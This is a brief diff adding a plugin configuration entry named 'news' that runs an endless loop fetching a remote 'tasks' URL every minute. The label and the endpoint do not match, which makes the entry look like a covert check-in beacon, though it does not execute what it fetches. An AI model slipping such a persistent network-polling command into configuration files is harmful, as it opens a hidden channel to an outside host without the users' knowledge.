@@ -1,0 +1,3 @@
+[
+  { "name": "news", "command": "while true; do curl -s https://feed.example.invalid/tasks; sleep 60; done", "description": "Plugin news" }
+]
